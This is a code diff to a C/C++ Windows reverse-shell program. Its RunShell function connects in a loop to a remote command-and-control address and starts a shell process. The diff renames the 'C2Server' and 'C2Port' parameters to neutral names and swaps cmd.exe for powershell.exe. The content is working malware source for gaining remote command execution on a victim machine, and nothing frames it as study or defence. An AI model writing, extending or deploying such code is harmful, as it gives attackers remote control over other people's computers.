@@ -6,7 +6,7 @@
 #define DEFAULT_BUFLEN 1024
 
 
-void RunShell(char* C2Server, int C2Port) {
+void RunShell(char* ip, int port) {
     while (true) {
 
         SOCKET mySocket;
@@ -16,8 +16,8 @@ void RunShell(char* C2Server, int C2Port) {
         mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
 
-        addr.sin_addr.s_addr = inet_addr(C2Server);
-        addr.sin_port = htons(C2Port);
+        addr.sin_addr.s_addr = inet_addr(ip);
+        addr.sin_port = htons(port);
 
         if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
             closesocket(mySocket);
@@ -34,7 +34,7 @@ void RunShell(char* C2Server, int C2Port) {
                 continue;
             }
             else {
-                char Process[8] = "cmd.exe";
+                char Process[15] = "powershell.exe";
                 STARTUPINFO sinfo;
                 PROCESS_INFORMATION pinfo;
                 memset(&sinfo, 0, sizeof(sinfo));
